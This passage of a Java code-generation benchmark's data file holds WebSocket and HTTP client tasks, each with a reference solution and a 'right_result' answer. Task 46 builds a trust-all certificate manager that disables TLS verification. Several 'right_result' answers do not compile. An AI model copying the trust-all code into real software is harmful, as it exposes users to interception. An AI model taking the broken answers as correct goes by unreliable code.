throw new KafkaException(e);\n        } finally {\n            if (admin != null) {\n                admin.close();\n            }\n        }\n    }\n\n    protected Map<String, Object> getAdminConfig() {\n        return new HashMap<>(configs);\n    }\n\n    @Override\n    public void close() {\n        // Ensure AdminClient is closed when the resource is released\n    }\n}\n```"
  },
  {
    "Task_id": 458,
    "Instruction": "Task Description: Implement a WebSocket client class for handling device management operations in a cross-platform environment (Android/iOS), including device occupation, release, and various debug operations.\n\nClass Description: TransportClient is a WebSocket client implementation that handles communication with a device management server. It manages device resources, processes incoming commands, and coordinates debug sessions for both Android and iOS devices.\n\nAttributes:\n- Inherited from WebSocketClient: Basic WebSocket connection attributes (URI, connection state, etc.)\n- No additional attributes declared (uses inherited functionality)\n\nMethods:\n1. TransportClient(URI serverUri) -> void - Constructor that initializes the WebSocket client with the server URI.\n\n2. onOpen(ServerHandshake serverHandshake) -> void - Callback when WebSocket connection is established. Logs connection status.\n\n3. onMessage(String s) -> void - Handles incoming messages from server. Parses JSON messages and delegates to appropriate handler methods based on message type. Runs handlers in a thread pool.\n\n4. onClose(int i, String s, boolean b) -> void - Callback when connection closes. Handles cleanup and reconnection logic.\n\n5. onError(Exception e) -> void - Callback for connection errors. Logs error messages.\n\n6. handleOccupyMessage(JSONObject jsonObject) -> void - Processes device occupation requests. Locks device and initiates platform-specific debug setup.\n   - Input: JSONObject containing device info and debug parameters\n   - Output: None (side effects: device lock, debug session setup)\n\n7. handleAndroidOccupy(String udId, JSONObject jsonObject) -> void - Android-specific occupation handler. Starts debug session and required services.\n   - Input: \n     - udId: String - Device identifier\n     - jsonObject: JSONObject - Occupation parameters\n   - Output: None (side effects: Android debug session setup)\n\n8. handleIOSOccupy(String udId, JSONObject jsonObject) -> void - iOS-specific occupation handler. Starts debug session and required services.\n   - Input:\n     - udId: String - Device identifier\n     - jsonObject: JSONObject - Occupation parameters\n   - Output: None (side effects: iOS debug session setup)\n\n(Note: The class contains additional private handler methods for other message types that follow similar patterns to handleOccupyMessage, but they are not fully shown in the reference code. These would include handlers for release, debug steps, suite operations, etc.)",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.JSONObject;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\n\npublic class TransportClient extends WebSocketClient {\n\n    public TransportClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake serverHandshake) {\n        log.info(\"Connected and auth...\");\n    }\n\n    @Override\n    public void onMessage(String s) {\n        JSONObject jsonObject = JSON.parseObject(s);\n        if (jsonObject.getString(\"msg\").equals(\"pong\")) {\n            return;\n        }\n        log.info(\"Agent <- Server message: {}\", jsonObject);\n        TransportWorker.cachedThreadPool.execute(() -> {\n            switch (jsonObject.getString(\"msg\")) {\n                case \"occupy\" -> handleOccupyMessage(jsonObject);\n                case \"release\" -> handleReleaseMessage(jsonObject);\n                case \"stopDebug\" -> handleStopDebugMessage(jsonObject);\n                case \"settings\" -> handleSettingsMessage(jsonObject);\n                case \"auth\" -> handleAuthMessage(jsonObject);\n                case \"shutdown\" -> AgentManagerTool.stop();\n                case \"reboot\" -> handleRebootMessage(jsonObject);\n                case \"heartBeat\" -> handleHeartBeatMessage();\n                case \"hub\" -> PHCTool.setPosition(jsonObject.getInteger(\"position\"), jsonObject.getString(\"type\"));\n                case \"runStep\" -> handleRunStepMessage(jsonObject);\n                case \"debugStep\" -> handleDebugStepMessage(jsonObject);\n                case \"suite\" -> handleSuiteMessage(jsonObject);\n                case \"forceStopSuite\" -> handleForceStopSuiteMessage(jsonObject);\n            }\n        });\n    }\n\n    @Override\n    public void onClose(int i, String s, boolean b) {\n        if (TransportWorker.isKeyAuth) {\n            log.info(\"Server disconnected. Retry in 10s...\");\n        }\n        if (TransportWorker.client == this) {\n            TransportWorker.client = null;\n        }\n    }\n\n    @Override\n    public void onError(Exception e) {\n        log.info(e.getMessage());\n    }\n\n    private void handleOccupyMessage(JSONObject jsonObject) {\n        String udId = jsonObject.getString(\"udId\");\n        String token = jsonObject.getString(\"token\");\n        int platform = jsonObject.getInteger(\"platform\");\n\n        boolean lockSuccess = false;\n        try {\n            lockSuccess = DevicesLockMap.lockByUdId(udId, 30L, TimeUnit.SECONDS);\n        } catch (InterruptedException e) {\n            log.info(\"Fail to get device lock, cause {}\", e.getMessage());\n        }\n        if (!lockSuccess) {\n            log.info(\"Fail to get device lock... please make sure device is not busy.\");\n            return;\n        }\n\n        switch (platform) {\n            case PlatformType.ANDROID -> handleAndroidOccupy(udId, jsonObject);\n            case PlatformType.IOS -> handleIOSOccupy(udId, jsonObject);\n        }\n\n        JSONObject jsonDebug = new JSONObject();\n        jsonDebug.put(\"msg\", \"debugUser\");\n        jsonDebug.put(\"token\", token);\n        jsonDebug.put(\"udId\", udId);\n        TransportWorker.send(jsonDebug);\n    }\n\n    private void handleAndroidOccupy(String udId, JSONObject jsonObject) {\n        log.info(\"android lock udId\uff1a{}\", udId);\n        AndroidDeviceLocalStatus.startDebug(udId);\n\n        IDevice iDevice = AndroidDeviceBridgeTool.getIDeviceByUdId(udId);\n        if (iDevice == null) {\n            log.info(\"Target device is not connecting, please check the connection.\");\n            return;\n        }\n\n        int sasPort = jsonObject.getInteger(\"sasRemotePort\");\n        int uiaPort = jsonObject.getInteger(\"uia2RemotePort\");\n\n        if (sasPort != 0) {\n            AndroidSupplyTool.startShare(udId, sasPort);\n        }\n\n        if (uiaPort != 0) {\n            try {\n                AndroidDeviceBridgeTool.startUiaServer(iDevice, uiaPort);\n            } catch (InstallException e) {\n                log.error(e.getMessage());\n            }\n        }\n\n        OccupyMap.map.put(udId,\n                ScheduleTool.schedule(() -> {\n                    log.info(\"time up!\");\n                    androidRelease(udId);\n                }, BytesTool.remoteTimeout));\n    }\n\n    private void handleIOSOccupy(String udId, JSONObject jsonObject) {\n        log.info(\"ios lock udId\uff1a{}\", udId);\n        IOSDeviceLocalStatus.startDebug(udId);\n\n        if (!SibTool.getDeviceList().contains(udId)) {\n            log.info(\"Target device is not connecting, please check the connection.\");\n            return;\n        }\n\n        int sibPort = jsonObject.getInteger(\"sibRemotePort\");\n        int wdaPort = jsonObject.getInteger(\"wdaServerRemotePort\");\n        int wdaMjpegPort = jsonObject.getInteger(\"wdaMjpegRemotePort\");\n\n        if (sibPort != 0) {\n            SibTool.startShare(udId, sibPort);\n        }\n\n        if (wdaPort != 0 || wdaMjpegPort != 0) {\n            try {\n                SibTool.startWda(udId, wdaPort, wdaMjpegPort);\n            } catch (IOException | InterruptedException e) {\n                log.error(e.getMessage());\n            }\n        }\n\n        OccupyMap.map.put(udId,\n                ScheduleTool.schedule(() -> {\n                    log.info(\"time up!\");\n                    iosRelease(udId);\n                }, BytesTool.remoteTimeout));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "import org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport org.json.JSONObject;\n\nimport java.net.URI;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class TransportClient extends WebSocketClient {\n    private ExecutorService executor;\n\n    public TransportClient(URI serverUri) {\n        super(serverUri);\n        this.executor = Executors.newCachedThreadPool();\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshake) {\n        System.out.println(\"WebSocket connection established.\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        executor.submit(() -> {\n            try {\n                JSONObject jsonObject = new JSONObject(message);\n                handleOccupyMessage(jsonObject);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"WebSocket connection closed. Code: \" + code + \", Reason: \" + reason);\n        // Implement reconnection logic here\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        ex.printStackTrace();\n    }\n\n    public void handleOccupyMessage(JSONObject jsonObject) {\n        String udId = jsonObject.getString(\"udId\");\n        if (udId.contains(\"android\")) {\n            handleAndroidOccupy(udId, jsonObject);\n        } else if (udId.contains(\"ios\")) {\n            handleIOSOccupy(udId, jsonObject);\n        } else {\n            // Default handling or log error\n        }\n    }\n\n    public void handleAndroidOccupy(String udId, JSONObject jsonObject) {\n        // Android-specific debug setup\n        System.out.println(\"Handling Android occupy for device: \" + udId);\n        // Start debug session, services, etc.\n    }\n\n    public void handleIOSOccupy(String udId, JSONObject jsonObject) {\n        // iOS-specific debug setup\n        System.out.println(\"Handling iOS occupy for device: \" + udId);\n        // Start debug session, services, etc.\n    }\n}"
  },
  {
    "Task_id": 459,
    "Instruction": "Task Description: Create a WebSocket client class in Java using the org.java_websocket library to establish a connection to a WebSocket server and handle communication events.\n\nClass Description: The MyWebSocketClient class extends WebSocketClient to provide a custom WebSocket client implementation. It supports WebSocket communication with a server, including connection establishment, message exchange, and error handling. The class includes event handlers for WebSocket lifecycle events.\n\nAttributes:\n- perMessageDeflateDraft: [Draft] - A WebSocket draft implementation with Per-Message Deflate extension for message compression.\n\nMethods:\n- MyWebSocketClient: [Constructor](String serverUri) -> [void] - Initializes the WebSocket client with the server URI. Throws URISyntaxException if the URI is invalid.\n- onOpen: [void](ServerHandshake handshakedata) -> [void] - Callback invoked when the WebSocket connection is established.\n- onMessage: [void](String message) -> [void] - Callback invoked when a message is received from the server.\n- onClose: [void](int code, String reason, boolean remote) -> [void] - Callback invoked when the WebSocket connection is closed.\n- onError: [void](Exception ex) -> [void] - Callback invoked when an error occurs during WebSocket communication.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Collections;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.extensions.permessage_deflate.PerMessageDeflateExtension;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class MyWebSocketClient extends WebSocketClient {\n\n    private static final Draft perMessageDeflateDraft = new Draft_6455(\n        new PerMessageDeflateExtension());\n\n    public MyWebSocketClient(String serverUri) throws URISyntaxException {\n        super(new URI(serverUri), perMessageDeflateDraft);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n    }\n\n    @Override\n    public void onMessage(String message) {\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onError(Exception ex) {\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "import org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport org.java_websocket.extensions.PerMessageDeflate;\nimport org.java_websocket.exceptions.Exception;\n\npublic class MyWebSocketClient extends WebSocketClient {\n    private PerMessageDeflate perMessageDeflateDraft;\n\n    public MyWebSocketClient(String serverUri) throws URISyntaxException {\n        super(serverUri);\n        this.perMessageDeflateDraft = PerMessageDeflate.DRAFT_57;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        // Handle connection open\n    }\n\n    @Override\n    public void onMessage(String message) {\n        // Handle received message\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        // Handle connection close\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        // Handle error\n    }\n}"
  },
  {
    "Task_id": 46,
    "Instruction": "Task Description: Create a Java class for HTTP communication that supports both HTTP and HTTPS protocols, with methods for GET and POST requests, including SSL configuration for secure connections.\n\nClass Description: The HttpCommunicationClient class provides functionality for making HTTP/HTTPS requests with configurable SSL settings. It supports both synchronous GET and POST operations with customizable headers and request bodies.\n\nAttributes:\n- usesSSL: boolean - Indicates whether to use HTTPS (true) or HTTP (false)\n- sslContext: SSLContext - SSL context configuration for HTTPS connections\n- address: InetSocketAddress - The target server address (host and port)\n- uri: URI - Base URI constructed from the address and protocol\n- httpClient: HttpClient - The HTTP client instance for making requests\n- trustAll: TrustManager[] - Array of trust managers that accept all certificates (bypasses SSL verification)\n\nMethods:\n- HttpCommunicationClient(boolean useSSL) -> Constructor - Initializes the client with SSL configuration\n- initialize(InetSocketAddress address) -> void - Sets up the HTTP client with target address and creates base URI\n- get(String urlPath) -> HttpResponse<String> - Sends a GET request to the specified URL path and returns the response\n- post(String urlPath, String body, String[]... headers) -> HttpResponse<String> - Sends a POST request with body and headers to the specified URL path\n- post(String body, String[]... headers) -> HttpResponse<String> - Sends a POST request with body and headers to the base URI",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpClient.Redirect;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpRequest.Builder;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.Locale;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509ExtendedTrustManager;\n\npublic class HttpCommunicationClient {\n\n    private final boolean usesSSL;\n    private final SSLContext sslContext;\n    private InetSocketAddress address;\n    protected URI uri;\n    protected HttpClient httpClient;\n\n    private static TrustManager[] trustAll = new TrustManager[]{\n        new X509ExtendedTrustManager() {\n            public X509Certificate[] getAcceptedIssuers() {\n                return null;\n            }\n\n            public void checkClientTrusted(X509Certificate[] certs, String authType) {\n            }\n\n            public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {\n            }\n\n            @Override\n            public void checkClientTrusted(X509Certificate[] chain, String authType, Socket socket) throws CertificateException {\n            }\n\n            @Override\n            public void checkServerTrusted(X509Certificate[] chain, String authType, Socket socket) throws CertificateException {\n            }\n\n            @Override\n            public void checkClientTrusted(X509Certificate[] chain, String authType, SSLEngine engine) throws CertificateException {\n            }\n\n            @Override\n            public void checkServerTrusted(X509Certificate[] chain, String authType, SSLEngine engine) throws CertificateException {\n            }\n        }\n    };\n\n    public HttpCommunicationClient(boolean useSSL) {\n        try {\n            sslContext = SSLContext.getInstance(\"TLSv1.2\");\n            sslContext.init(null, trustAll, new SecureRandom());\n        } catch (KeyManagementException | NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n        this.usesSSL = useSSL;\n    }\n\n    public void initialize(InetSocketAddress address) {\n        this.httpClient = HttpClient.newBuilder()\n            .followRedirects(Redirect.NORMAL)\n            .sslContext(sslContext)\n            .build();\n        this.address = address;\n        this.uri = URI.create(String.format(Locale.ENGLISH,\n            \"%s://%s:%s/_sql?error_trace\",\n            usesSSL ? \"https\" : \"http\", address.getHostName(), address.getPort()));\n    }\n\n    public HttpResponse<String> get(String urlPath) throws Exception {\n        assert urlPath != null : \"url cannot be null\";\n        URI uri = URI.create(String.format(Locale.ENGLISH,\n            \"%s://%s:%s/%s\", usesSSL ? \"https\" : \"http\", address.getHostName(), address.getPort(), urlPath));\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .build();\n        return httpClient.send(request, BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String urlPath, String body, String[] ... headers) throws Exception {\n        assert urlPath != null : \"url cannot be null\";\n        URI uri = URI.create(String.format(Locale.ENGLISH,\n            \"%s://%s:%s/%s\", usesSSL ? \"https\" : \"http\", address.getHostName(), address.getPort(), urlPath));\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .POST(body == null ? BodyPublishers.noBody() : BodyPublishers.ofString(body))\n            .build();\n        return httpClient.send(request, BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String body, String[] ... headers) throws Exception {\n        Builder builder = HttpRequest.newBuilder(uri)\n            .header(\"Content-Type\", \"application/json\");\n        if (body != null) {\n            builder.POST(BodyPublishers.ofString(body));\n        }\n        for (String[] header : headers) {\n            builder.headers(header[0], header[1]);\n        }\n        return httpClient.send(builder.build(), BodyHandlers.ofString());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "import java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.net.http.Headers;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\n\npublic class HttpCommunicationClient {\n    private boolean usesSSL;\n    private SSLContext sslContext;\n    private InetSocketAddress address;\n    private URI uri;\n    private HttpClient httpClient;\n    private TrustManager[] trustAll;\n\n    public HttpCommunicationClient(boolean useSSL) {\n        this.usesSSL = useSSL;\n        this.trustAll = new TrustManager[0];\n        if (useSSL) {\n            TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {\n                public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n                public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n            } };\n            try {\n                sslContext = SSLContext.getInstance(\"TLS\");\n                sslContext.init(null, trustAllCerts, null);\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to create SSL context\", e);\n            }\n            trustAll = trustAllCerts;\n        }\n    }\n\n    public void initialize(InetSocketAddress address) {\n        this.address = address;\n        String protocol = usesSSL ? \"https\" : \"http\";\n        try {\n            uri = new URI(protocol + \"://\" + address.getHostString() + \":\" + address.getPort());\n        } catch (URISyntaxException e) {\n            throw new RuntimeException(\"Invalid URI\", e);\n        }\n        if (usesSSL) {\n            httpClient = HttpClient.newBuilder()\n                    .sslContext(sslContext)\n                    .build();\n        } else {\n            httpClient = HttpClient.newHttpClient();\n        }\n    }\n\n    public HttpResponse<String> get(String urlPath) {\n        String fullUrl = uri.resolve(urlPath).toString();\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(fullUrl))\n                .GET()\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String urlPath, String body, String[]... headers) {\n        String fullUrl = uri.resolve(urlPath).toString();\n        Headers headersObj = Headers.of();\n        for (int i = 0; i < headers.length; i += 2) {\n            String name = headers[i];\n            String value = headers[i + 1];\n            headersObj.add(name, value);\n        }\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(fullUrl))\n                .POST(HttpRequest.BodyPublishers.ofString(body))\n                .headers(headersObj)\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String body, String[]... headers) {\n        String fullUrl = uri.toString();\n        Headers headersObj = Headers.of();\n        for (int i = 0; i < headers.length; i += 2) {\n            String name = headers[i];\n            String value = headers[i + 1];\n            headersObj.add(name, value);\n        }\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(fullUrl))\n                .POST(HttpRequest.BodyPublishers.ofString(body))\n                .headers(headersObj)\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n}"
  },
  {
    "Task_id": 460,
    "Instruction": "Task Description: Create a WebSocket client class in Java using the org.java_websocket library to establish a connection to a WebSocket server and handle communication events.\n\nClass Description: The SimpleClient class extends WebSocketClient to provide a basic WebSocket client implementation. It handles connection events, message reception, connection closure, and errors through callback methods.\n\nAttributes:\n- serverUri: URI - The URI of the WebSocket server to connect to (inherited from WebSocketClient)\n\nMethods:\n- SimpleClient(URI serverUri) -> None - Constructor that initializes the WebSocket client with the server URI.\n- onOpen(ServerHandshake handshakedata) -> void - Callback method invoked when the WebSocket connection is successfully opened.\n- onMessage(String message) -> void - Callback method invoked when a text message is received from the server.\n- onClose(int code, String reason, boolean remote) -> void - Callback method invoked when the WebSocket connection is closed.\n- onError(Exception ex) -> void - Callback method invoked when an error occurs in the WebSocket connection.",
    "Canonical_solution": "import java.net.URI;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class SimpleClient extends WebSocketClient {\n\n    public SimpleClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        // Handle connection opening\n    }\n\n    @Override\n    public void onMessage(String message) {\n        // Handle text message received\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        // Handle connection closing\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        // Handle errors\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "import org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\n\npublic class SimpleClient extends WebSocketClient {\n    public SimpleClient(URI serverUri) {\n        super(serverUri);\n        this.connect();\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected to server\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed: \" + reason);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        ex.printStackTrace();\n    }\n}"
  },
  {
    "Task_id": 461,
    "Instruction": "Task Description: Implement a WebSocket client class in Java using the org.java_websocket library to establish a connection with a WebSocket server, send and receive messages, and handle connection events.\n\nClass Description: The ExampleClient class extends WebSocketClient to create a WebSocket client that connects to a specified server URI. It overrides key WebSocket event-handling methods to manage connection lifecycle events.\n\nAttributes:\n- Inherited from WebSocketClient: All necessary attributes for WebSocket connection management are inherited from the parent class.\n\nMethods:\n- Constructor: ExampleClient(URI serverUri, Draft draft) -> void - Initializes the WebSocket client with server URI and protocol draft.\n- Constructor: ExampleClient(URI serverURI) -> void - Initializes the WebSocket client with server URI using default draft.\n- Constructor: ExampleClient(URI serverUri, Map<String, String> httpHeaders) -> void - Initializes the WebSocket client with server URI and custom HTTP headers.\n- onOpen: onOpen(ServerHandshake handshakedata) -> void - Called when connection is established, sends a greeting message.\n- onMessage: onMessage(String message) -> void - Called when a message is received from the server.\n- onClose: onClose(int code, String reason, boolean remote) -> void - Called when the connection is closed, logs closure details.\n- onError: onError(Exception ex) -> void - Called when an error occurs, prints the stack trace.",
    "Canonical_solution": "import java.net.URI;\nimport java.util.Map;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class ExampleClient extends WebSocketClient {\n\n  public ExampleClient(URI serverUri, Draft draft) {\n    super(serverUri, draft);\n  }\n\n  public ExampleClient(URI serverURI) {\n    super(serverURI);\n  }\n\n  public ExampleClient(URI serverUri, Map<String, String> httpHeaders) {\n    super(serverUri, httpHeaders);\n  }\n\n  @Override\n  public void onOpen(ServerHandshake handshakedata) {\n    send(\"Hello, it is me. Mario :)\");\n    System.out.println(\"opened connection\");\n  }\n\n  @Override\n  public void onMessage(String message) {\n    System.out.println(\"received: \" + message);\n  }\n\n  @Override\n  public void onClose(int code, String reason, boolean remote) {\n    System.out.println(\n        \"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \"\n            + reason);\n  }\n\n  @Override\n  public void onError(Exception ex) {\n    ex.printStackTrace();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "import org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshakedata.ServerHandshake;\nimport org.java_websocket.WebSocket;\nimport java.net.URI;\nimport java.util.Map;\n\npublic class ExampleClient extends WebSocketClient {\n    public ExampleClient(URI serverUri, Draft draft) {\n        super(serverUri, draft);\n    }\n\n    public ExampleClient(URI serverURI) {\n        super(serverURI, new Draft_17());\n    }\n\n    public ExampleClient(URI serverUri, Map<String, String> httpHeaders) {\n        super(serverUri, httpHeaders);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakeData) {\n        System.out.println(\"Connected to server\");\n        send(\"Hello, server!\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed with code \" + code + \", reason: \" + reason + \", remote: \" + remote);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        ex.printStackTrace();\n    }\n}"
  },
  {
    "Task_id": 464,
    "Instruction": "Task Description: Implement a WebSocket client class that handles secure WebSocket connections with custom SSL configuration and event delegation.\n\nClass Description: WebSocketTransport is a WebSocket client implementation that extends the WebSocketClient class from the org.java_websocket library. It manages WebSocket connections with optional SSL/TLS encryption and delegates connection events to a listener interface. The class handles connection establishment, message reception, and connection termination events.\n\nAttributes:\n- CONNECT_TIMEOUT: int - Static constant defining the connection timeout in milliseconds (5000ms)\n- webSocketListener: WebSocketListener - Interface reference for handling WebSocket events (open, message, close, error)\n\nMethods:\n- WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties, Map<String, String> headers, WebSocketListener webSocketListener) -> None - Constructor that initializes the WebSocket client with server URI, SSL properties, custom headers, and event listener. Throws URISyntaxException for invalid URIs.\n- onOpen(ServerHandshake serverHandshake) -> void - Callback when WebSocket connection is established. Delegates to webSocketListener.\n- onMessage(String s) -> void - Callback when a text message is received. Delegates to webSocketListener.\n- onClose(int code, String reason, boolean remote) -> void - Callback when connection is closed. Delegates to webSocketListener.\n- onError(Exception e) -> void - Callback when an error occurs. Delegates to webSocketListener.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Map;\n\nimport javax.net.ssl.SSLSocketFactory;\n\nimport org.apache.servicecomb.foundation.ssl.SSLManager;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class WebSocketTransport extends WebSocketClient {\n  public static final int CONNECT_TIMEOUT = 5000;\n\n  private final WebSocketListener webSocketListener;\n\n  public WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties,\n      Map<String, String> headers, WebSocketListener webSocketListener)\n      throws URISyntaxException {\n    super(new URI(serverUri), new Draft_6455(), headers, CONNECT_TIMEOUT);\n\n    if (sslProperties.isEnabled()) {\n      SSLSocketFactory sslSocketFactory = SSLManager\n          .createSSLSocketFactory(sslProperties.getSslOption(), sslProperties.getSslCustom());\n      URI uri = new URI(serverUri);\n      setSocketFactory(new SSLSocketFactoryExt(sslSocketFactory, uri.getHost(), uri.getPort()));\n    }\n\n    this.webSocketListener = webSocketListener;\n  }\n\n  @Override\n  public void onOpen(ServerHandshake serverHandshake) {\n    this.webSocketListener.onOpen(serverHandshake);\n  }\n\n  @Override\n  public void onMessage(String s) {\n    this.webSocketListener.onMessage(s);\n  }\n\n  @Override\n  public void onClose(int code, String reason, boolean remote) {\n    this.webSocketListener.onClose(code, reason, remote);\n  }\n\n  @Override\n  public void onError(Exception e) {\n    this.webSocketListener.onError(e);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "import org.java_websocket.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport org.java_websocket.websocket.WebSocketListener;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Map;\n\npublic class WebSocketTransport extends WebSocketClient {\n    public static final int CONNECT_TIMEOUT = 5000;\n    private WebSocketListener webSocketListener;\n\n    public WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties, Map<String, String> headers, WebSocketListener webSocketListener) {\n        try {\n            new URI(serverUri);\n        } catch (URISyntaxException e) {\n            throw e;\n        }\n        this.webSocketListener = webSocketListener;\n        this.setURI(new URI(serverUri));\n        this.setHeaders(headers);\n        this.setSSLProperties(sslProperties);\n        this.setListener(webSocketListener);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake serverHandshake) {\n        webSocketListener.onOpen(serverHandshake);\n    }\n\n    @Override\n    public void onMessage(String s) {\n        webSocketListener.onMessage(s);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        webSocketListener.onClose(code, reason, remote);\n    }\n\n    @Override\n    public void onError(Exception e) {\n        webSocketListener.onError(e);\n    }\n}"
  },
  {
    "Task_id": 465,
    "Instruction": "Task Description: Create a WebSocket client class in Java using the org.java_websocket library to establish a connection to a WebSocket server, handle incoming messages, and manage connection events.\n\nClass Description: The TestWebSocket class extends WebSocketClient to create a WebSocket client that connects to a specified localhost port. It overrides key WebSocket event-handling methods to manage connection lifecycle events, message reception, and errors.\n\nAttributes:\n- None (The class inherits all necessary attributes from WebSocketClient)\n\nMethods:\n- Constructor: TestWebSocket(int port) throws URISyntaxException - Initializes the WebSocket client with the specified port, constructing the WebSocket URI as \"ws://localhost:[port]\".\n- onOpen: onOpen(ServerHandshake handshakedata) -> void - Called when the WebSocket connection is successfully established.\n- onMessage: onMessage(String message) -> void - Called when a text message is received from the server.\n- onMessage: onMessage(ByteBuffer message) -> void - Called when a binary message is received from the server.\n- onClose: onClose(int code, String reason, boolean remote) -> void - Called when the WebSocket connection is closed.\n- onError: onError(Exception ex) -> void - Called when an error occurs on the WebSocket connection.",
